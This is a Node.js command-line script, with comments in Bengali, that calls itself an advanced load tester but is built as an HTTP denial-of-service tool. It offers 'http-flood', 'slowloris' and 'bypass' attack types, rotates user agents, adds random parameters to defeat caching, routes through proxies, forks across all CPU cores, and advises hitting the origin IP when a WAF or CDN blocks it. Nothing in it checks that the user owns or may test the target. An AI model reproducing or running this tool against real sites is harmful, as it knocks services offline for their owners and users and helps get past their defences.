#!/usr/bin/env node

const axios = require('axios');
const { program } = require('commander');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

// কনফিগারেশন
let stats = {
    total: 0,
    success: 0,
    failed: 0,
    errors: [],
    startTime: null,
    endTime: null,
    bytesTransferred: 0,
    responseTimes: []
};

// User Agents
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1'
];

// প্রোগ্রাম কনফিগারেশন
program
    .name('loadtester')
    .description('Advanced load testing tool for website performance analysis')
    .version('2.0.0')
    .requiredOption('-t, --target <url>', 'Target URL to test')
    .option('-d, --duration <seconds>', 'Test duration in seconds', '30')
    .option('-c, --connections <number>', 'Number of concurrent connections', '10')
    .option('-r, --rate <number>', 'Requests per second', '50')
    .option('-m, --method <method>', 'HTTP method (GET, POST, PUT, DELETE)', 'GET')
    .option('--body <data>', 'Request body for POST/PUT')
    .option('--headers <json>', 'Custom headers in JSON format')
    .option('--proxy <url>', 'Proxy URL (http://proxy:8080)')
    .option('--timeout <ms>', 'Request timeout in milliseconds', '5000')
    .option('--no-tls-verify', 'Disable TLS/SSL verification')
    .option('--report <file>', 'Save detailed report to file')
    .option('--multi-core', 'Use multiple CPU cores for testing')
    .option('--attack-type <type>', 'Attack type: http-flood, slowloris, bypass', 'http-flood')
    .option('--random-params', 'Add random query parameters to bypass cache')
    .option('--cookies <file>', 'Load cookies from file');

program.parse(process.argv);

const options = program.opts();

// মাল্টি-কোর সাপোর্ট
if (options.multiCore && cluster.isMaster) {
    const numCPUs = os.cpus().length;
    console.log(chalk.cyan(`🚀 Using ${numCPUs} CPU cores for testing...`));
    
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        console.log(chalk.yellow(`Worker ${worker.process.pid} died`));
        cluster.fork();
    });
    
    return;
}

// মেইন ফাংশন
async function main() {
    console.log(chalk.cyan('\n╔══════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║     LoadTest v2.0 - Advanced Load Tester   ║'));
    console.log(chalk.cyan('╚══════════════════════════════════════════════╝\n'));

    const target = options.target;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        console.log(chalk.red('❌ Error: Target must start with http:// or https://'));
        process.exit(1);
    }

    // কনফিগারেশন প্রিন্ট
    console.log(chalk.yellow('📋 Test Configuration:'));
    console.log(`   Target: ${chalk.green(target)}`);
    console.log(`   Duration: ${chalk.green(options.duration)} seconds`);
    console.log(`   Connections: ${chalk.green(options.connections)}`);
    console.log(`   Rate: ${chalk.green(options.rate)} req/sec`);
    console.log(`   Method: ${chalk.green(options.method)}`);
    console.log(`   Attack Type: ${chalk.green(options.attackType)}`);
    console.log(`   Timeout: ${chalk.green(options.timeout)} ms`);
    if (options.proxy) console.log(`   Proxy: ${chalk.green(options.proxy)}`);
    if (options.randomParams) console.log(`   Random Params: ${chalk.green('Enabled')}`);
    console.log('');

    // স্টার্ট টেস্ট
    console.log(chalk.green('🚀 Starting load test...\n'));

    const duration = parseInt(options.duration);
    const connections = parseInt(options.connections);
    const rate = parseInt(options.rate);
    const timeout = parseInt(options.timeout);
    const method = options.method.toUpperCase();

    // প্রোক্সি এজেন্ট
    let proxyAgent = null;
    if (options.proxy) {
        proxyAgent = new HttpsProxyAgent(options.proxy);
    }

    // কাস্টম হেডার
    let customHeaders = {};
    if (options.headers) {
        try {
            customHeaders = JSON.parse(options.headers);
        } catch (e) {
            console.log(chalk.red('❌ Error: Invalid JSON for headers'));
            process.exit(1);
        }
    }

    stats.startTime = Date.now();

    // প্রগ্রেস বার
    const progressBar = new cliProgress.SingleBar({
        format: 'Progress |' + chalk.cyan('{bar}') + '| {percentage}% || {value}/{total} requests',
        barCompleteChar: '\u2588',
        barIncompleteChar: '\u2591',
        hideCursor: true
    });

    const totalRequests = duration * rate;
    progressBar.start(totalRequests, 0);

    // রিকুয়েস্ট ফাংশন
    async function sendRequest() {
        const startTime = Date.now();
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        let url = target;
        
        // র্যান্ডম প্যারামিটার (ক্যাশে বাইপাসের জন্য)
        if (options.randomParams) {
            const randomParam = `_=${Date.now()}_${Math.random().toString(36).substring(7)}`;
            url += (url.includes('?') ? '&' : '?') + randomParam;
        }

        // অ্যাটাক টাইপ অনুযায়ী হেডার কনফিগারেশন
        let headers = {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            ...customHeaders
        };

        // Slowloris অ্যাটাকের জন্য স্পেশাল হেডার
        if (options.attackType === 'slowloris') {
            headers['Connection'] = 'keep-alive';
            headers['Keep-Alive'] = 'timeout=999, max=1000';
        }

        const config = {
            method: method,
            url: url,
            timeout: timeout,
            headers: headers,
            httpsAgent: proxyAgent,
            validateStatus: false,
            maxRedirects: 5,
            ...(options.body && { data: options.body })
        };

        if (options.noTlsVerify) {
            config.httpsAgent = new (require('https').Agent)({ rejectUnauthorized: false });
        }

        try {
            const response = await axios(config);
            const responseTime = Date.now() - startTime;

            stats.total++;
            stats.bytesTransferred += parseInt(response.headers['content-length']) || 0;
            stats.responseTimes.push(responseTime);

            if (response.status >= 200 && response.status < 400) {
                stats.success++;
                progressBar.increment();
            } else {
                stats.failed++;
                stats.errors.push({
                    status: response.status,
                    time: responseTime,
                    url: url
                });
                progressBar.increment();
            }

            return { success: true, status: response.status, time: responseTime };
        } catch (error) {
            stats.total++;
            stats.failed++;
            
            let errorMsg = error.message;
            if (error.code === 'ECONNREFUSED') errorMsg = 'Connection Refused';
            else if (error.code === 'ETIMEDOUT') errorMsg = 'Timeout';
            else if (error.code === 'ENOTFOUND') errorMsg = 'DNS Failed';
            else if (error.code === 'ECONNRESET') errorMsg = 'Connection Reset';
            
            stats.errors.push({
                error: errorMsg,
                url: url,
                time: Date.now() - startTime
            });
            
            progressBar.increment();
            return { success: false, error: errorMsg };
        }
    }

    // রিকুয়েস্ট জেনারেটর
    const interval = 1000 / rate;
    let startTime = Date.now();

    const requestGenerator = setInterval(() => {
        if (Date.now() - startTime > duration * 1000) {
            clearInterval(requestGenerator);
            return;
        }
        
        for (let i = 0; i < connections; i++) {
            if (Date.now() - startTime > duration * 1000) break;
            sendRequest().catch(() => {});
        }
    }, interval);

    // ডিউরেশন শেষ
    await new Promise(resolve => setTimeout(resolve, duration * 1000 + 3000));
    clearInterval(requestGenerator);
    await new Promise(resolve => setTimeout(resolve, 3000));

    stats.endTime = Date.now();
    progressBar.stop();

    // রিপোর্ট
    generateReport();
}

// রিপোর্ট জেনারেট
function generateReport() {
    const totalTime = (stats.endTime - stats.startTime) / 1000;
    const successRate = stats.total > 0 ? (stats.success / stats.total * 100).toFixed(2) : 0;
    const avgRequestsPerSec = (stats.total / totalTime).toFixed(2);
    const bandwidth = stats.bytesTransferred / (totalTime * 1024);
    
    // রেসপন্স টাইম অ্যানালাইসিস
    let avgResponseTime = 0;
    let minResponseTime = 0;
    let maxResponseTime = 0;
    
    if (stats.responseTimes.length > 0) {
        const sorted = stats.responseTimes.sort((a, b) => a - b);
        avgResponseTime = sorted.reduce((a, b) => a + b, 0) / sorted.length;
        minResponseTime = sorted[0];
        maxResponseTime = sorted[sorted.length - 1];
    }

    console.log(chalk.cyan('\n╔══════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║              Test Results                   ║'));
    console.log(chalk.cyan('╚══════════════════════════════════════════════╝\n'));

    console.log(chalk.yellow('📊 Statistics:'));
    console.log(`   Total Requests: ${chalk.white(stats.total.toLocaleString())}`);
    console.log(`   ✅ Successful: ${chalk.green(stats.success.toLocaleString())}`);
    console.log(`   ❌ Failed: ${chalk.red(stats.failed.toLocaleString())}`);
    console.log(`   📈 Success Rate: ${chalk[successRate > 90 ? 'green' : 'yellow'](successRate + '%')}`);
    console.log(`   ⚡ Avg Requests/sec: ${chalk.white(avgRequestsPerSec)}`);
    console.log(`   📡 Bandwidth: ${chalk.white(bandwidth.toFixed(2) + ' KB/s')}`);
    console.log(`   ⏱️  Total Time: ${chalk.white(totalTime.toFixed(2) + 's')}`);
    console.log(`   💾 Data Transferred: ${chalk.white((stats.bytesTransferred / (1024 * 1024)).toFixed(2) + ' MB')}`);
    
    console.log(chalk.yellow('\n⏱️  Response Times:'));
    console.log(`   Average: ${chalk.white(avgResponseTime.toFixed(2) + ' ms')}`);
    console.log(`   Minimum: ${chalk.green(minResponseTime.toFixed(2) + ' ms')}`);
    console.log(`   Maximum: ${chalk.red(maxResponseTime.toFixed(2) + ' ms')}`);

    // এরর সমারি
    if (stats.errors.length > 0) {
        console.log(chalk.red('\n⚠️  Error Summary:'));
        const errorCount = {};
        stats.errors.forEach(err => {
            const key = err.status || err.error;
            errorCount[key] = (errorCount[key] || 0) + 1;
        });
        
        Object.entries(errorCount).slice(0, 10).forEach(([error, count]) => {
            console.log(`   ${error}: ${count} times`);
        });
        
        if (Object.keys(errorCount).length > 10) {
            console.log(`   ... and ${Object.keys(errorCount).length - 10} more error types`);
        }
    }

    // WAF ডিটেকশন
    if (stats.failed > stats.total * 0.3) {
        console.log(chalk.yellow('\n⚠️  Warning: High failure rate (${((stats.failed/stats.total)*100).toFixed(1)}%)'));
        console.log(chalk.yellow('   Your site might be protected by WAF/CDN.'));
        console.log(chalk.yellow('   💡 Tip: Enable dev mode or test via direct IP.'));
    }

    // সার্ভার হেলথ চেক
    if (avgResponseTime > 1000) {
        console.log(chalk.red('\n⚠️  Server is responding slowly!'));
        console.log(chalk.red('   Average response time > 1 second.'));
        console.log(chalk.red('   💡 Consider optimizing your server.'));
    }

    console.log(chalk.green('\n✅ Test completed successfully!\n'));

    // রিপোর্ট সেভ
    if (options.report) {
        const report = {
            timestamp: new Date().toISOString(),
            target: options.target,
            config: {
                duration: options.duration,
                connections: options.connections,
                rate: options.rate,
                method: options.method,
                attackType: options.attackType
            },
            results: {
                totalRequests: stats.total,
                success: stats.success,
                failed: stats.failed,
                successRate: parseFloat(successRate),
                avgRequestsPerSec: parseFloat(avgRequestsPerSec),
                bandwidth: parseFloat(bandwidth),
                totalTime: parseFloat(totalTime),
                dataTransferred: stats.bytesTransferred,
                avgResponseTime: parseFloat(avgResponseTime),
                minResponseTime: parseFloat(minResponseTime),
                maxResponseTime: parseFloat(maxResponseTime)
            },
            errors: stats.errors.slice(0, 100)
        };

        fs.writeFileSync(options.report, JSON.stringify(report, null, 2));
        console.log(chalk.green(`📄 Detailed report saved to: ${options.report}`));
    }
}

// এরর হ্যান্ডলিং
process.on('unhandledRejection', (err) => {
    console.log(chalk.red('❌ Unhandled error:'), err.message);
});

// মেইন ফাংশন কল
if (!options.multiCore || cluster.isWorker) {
    main().catch(err => {
        console.log(chalk.red('❌ Fatal error:'), err.message);
        process.exit(1);
    });
}
